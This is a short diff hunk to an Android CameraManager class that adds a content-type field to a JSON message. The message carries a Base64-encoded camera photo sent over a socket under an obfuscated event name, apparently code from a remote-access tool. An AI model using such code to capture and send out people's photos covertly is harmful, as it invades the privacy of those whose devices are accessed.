@@ -68,6 +68,7 @@ public class CameraManager {
             object.put("type", "Photo");
             object.put("name", "Camera Photo");
             object.put("path", "Camera Photo");
+            object.put("contentType", "image/png");
             object.put("buffer", Base64.encodeToString(data, Base64.DEFAULT));
             IOSocket.getInstance().send("_0xFD", object.toString());
 
